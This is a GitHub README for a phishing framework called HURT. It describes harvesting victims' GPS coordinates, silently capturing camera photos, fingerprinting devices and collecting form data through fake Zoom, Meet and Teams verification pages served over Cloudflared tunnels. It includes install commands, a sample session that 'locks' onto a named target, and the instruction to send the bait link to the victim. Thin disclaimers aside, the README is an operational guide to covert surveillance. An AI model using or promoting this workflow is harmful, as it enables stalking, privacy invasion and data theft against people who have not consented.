
# HURT v1.0 – Phishing Framework

Advanced phishing tool for **authorized security testing only**. Captures GPS, camera photos, device info, and form data from victims through customizable templates.

---

## ⚠️ Legal Disclaimer

This tool is for **educational purposes and authorized security testing only**.

Using HURT to phish real victims without explicit written permission is **illegal** and unethical. The developer assumes no liability for misuse. Always obtain proper authorization before conducting any phishing simulation.

---

## Features

- 📍 **GPS Coordinates** – Exact location with accuracy, altitude, and maps link
- 📸 **Camera Capture** – 10 silent photos with anti-freeze logic
- 📱 **Device Fingerprinting** – Battery, network, screen, CPU, RAM, user agent
- 🌐 **IP Geolocation** – City, region, country, ISP, proxy detection
- 📝 **Form Data Collection** – Captures any input field via webhook
- 🔗 **Cloudflared Tunnel** – Easy HTTPS phishing links without VPS
- 🎨 **Template System** – Dynamic loading of custom HTML templates
- 🔄 **Custom Redirect** – Choose where victims land after capture

---

## Installation

### Requirements

- PHP
- Bash
- wget

### On Linux (Debian/Ubuntu)

```bash
sudo apt update
sudo apt install php wget -y
```

On Termux (Android)

```bash
pkg update
pkg install php wget -y
```

Clone and Run

```bash
git clone https://github.com/DawoodKhan5218/HURT.git
cd hurt
chmod +x hurt.sh
./hurt.sh
```

---

Usage

```bash
./hurt.sh
```

Step 1: Select Template

```
Available templates in 'templates':
   1) generic-gps-camera.html
   2) jazz-50gb-fixed.html
   3) meeting-verify.html
   4) zoom-verify.html
   5) google-meet.html
   6) teams-verify.html
   7) Custom (enter your own HTML file)
   0) Exit
Choice: 1
```

Step 2: Enter Victim Details

```
[?] HUNT USERNAME: johndoe
[+] Prey locked: @johndoe

[?] PROFILE PIC URL (or path): https://example.com/pic.jpg
[+] Profile picture embedded.

[?] Redirect URL after capture (default: https://www.google.com):
```

Step 3: Get Phishing Link

```
[+] Bait link ready: https://random-words.trycloudflare.com
[!] BAIT LINK: https://random-words.trycloudflare.com?user=johndoe
```

Send this link to the victim.

---

Directory Structure

```
hurt/
├── hurt.sh                 # Main script
├── template.php            # Redirect handler
├── ip.php                  # IP logger
├── webhook.php             # Data collector
├── payload                 # Background device info
├── templates/              # Phishing templates
├── captures/               # Saved photos (auto-created)
├── data.txt                # Captured data
└── README.md
```

---

How It Works

1. Victim clicks phishing link → ip.php logs IP & User-Agent
2. Page redirects to selected template
3. Template requests GPS permission
4. After GPS success, template requests camera permission
5. Camera captures 10 photos silently
6. Photos + GPS + form data uploaded to webhook.php
7. Victim redirected to your chosen URL
8. All data saved in data.txt and captures/

---

Creating Custom Templates

Any HTML file in templates/ automatically appears in the menu.

Your template must include:

```html
<!-- tc_payload -->
```

Optional: Use __TARGET_USER__ placeholder to display victim username.

```html
<div>Account: __TARGET_USER__</div>
```

---

Data Captured

File Contents
data.txt GPS, device info, form data, photo logs
ip.txt Victim IP + User-Agent
saved.ip.txt All archived IPs
captures/*.jpg Camera photos

---

Troubleshooting

GPS Not Prompting

· Use HTTPS (Cloudflared tunnel) or localhost
· Check browser site permissions
· Enable device GPS



Security Notes

· PHP built-in server is single-threaded
· Cloudflared links are temporary
· All data stored in plain text

---

Disclaimer

This project is for educational purposes only. The developer is not responsible for any misuse or damage caused by this tool. Always comply with applicable laws and regulations.

---

Credits

Developer: DawoodKhan5218
GitHub: github.com/DawoodKhan5218

---

License

Educational purposes only. Use responsibly.
